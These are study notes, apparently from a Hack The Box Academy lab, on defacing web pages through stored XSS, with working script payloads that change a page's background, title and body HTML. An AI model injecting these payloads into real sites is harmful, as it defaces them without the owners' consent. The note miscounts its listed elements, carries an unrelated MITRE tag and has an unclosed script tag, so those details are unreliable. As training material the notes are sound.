---
title: Defacing Using XSS
aliases: []
tags:
- study-notes/xss
- technique/t1077
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: 19-103-CrossSiteScripting-06-Defacing.pdf
related_tools:
- '[[burpsuite]]'
- '[[gobuster]]'
- '[[fierce]]'
- '[[ffuf]]'
- '[[dirb]]'
- '[[cewl]]'
- '[[fierce]]'
- '[[gobuster]]'
- '[[burpsuite]]'
related_techniques:
- '[[t1077]]'
related_tactics: []
related_services: []
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: T1077
real_path: ''
port: ''
protocol: ''
os: ''
---

# Defacing Using XSS

## Introduction to XSS
Defacing using Cross-Site Scripting (XSS) is a common attack used with stored XSS vulnerabilities. The damage and the scope of an XSS attack depend on the type of XSS, with stored XSS being the most critical, while DOM-based XSS is less so. One of the most common attacks used with stored XSS vulnerabilities is website defacing attacks, where the attacker changes the look of the website for anyone who visits it. This can be used to claim that the website has been hacked, as seen in the 2018 defacement of the UK National Health Service (NHS). Such attacks can have significant repercussions, affecting a company's investments and share prices, especially for banks and technology firms.

## Defacement Elements
We can use injected JavaScript code (through XSS) to change the main look of a web page. However, defacing a website is typically used to send a simple message (i.e., 'we successfully hacked you'), so giving the defaced web page a beautiful look isn't really the target. Three HTML elements are usually utilized to change the main look of a web page:
- Background Color: `document.body.style.background`
- Background Image: `document.body.background`
- Page Title: `document.title`
- Page Text: `DOM.innerHTML`
We can use two or three of these elements to write a basic message to the web page and even remove the vulnerable element to make it more difficult to quickly reset the web page.

## Changing Background
To change the background of a web page, we can use the following payload:
```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```
Try using the above payload to see how the final result may look.

## Changing Page Title
We can change the page title from '2Do' to any title of our choosing, using the `document.title` JavaScript function:
```html
<script>document.title = 'HackTheBox Academy'</script>
```
We can see from the page window/tab that our new title has replaced the previous one.

## Changing the Entire HTML Code
To change the entire HTML code of the web page, we can use the following payload:
```javascript
document.getElementsByTagName('body')[0].innerHTML = 'New Text'
```
As we can see, we can specify the body element with `document.getElementsByTagName('body')`, and by specifying the first body element, we can change the entire text of the web page. We may also use jQuery to achieve the same thing. Before sending our payload and making a permanent change, we should prepare our HTML code separately and then use `document.body.innerHTML` to set our HTML code to the page source.

For our exercise, we will borrow the HTML code from the main page of Hack The Box Academy:
```html
<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt=""></p></center>
```
We will minify the HTML code into a single line and add it to our previous XSS payload. The final payload should be as follows:
```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt=""></p></center>'
```
Once we add our payload to the vulnerable To-Do list, we will see that our HTML code is now permanently part of the web page's source code.

## Example Payload
The following example payload can be used to deface the web page:
```html
<div></div><ul class="list-unstyled" id="todo"><ul>
<script>document.body.style.background = "#141d2b"</script>
</ul><ul><script>document.title = 'HackTheBox Academy'</script>
</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt=""></p></center>'</script>
</ul></ul>
```
This is because our injected JavaScript code changes the look of the page when it gets executed, which in this case, is at the end of the source code. If our injection was in an element in the middle of the source code, then other scripts or elements may get added to the page, so we would have to account for them to get the final look we need.

## References
- https://academy.hackthebox.com

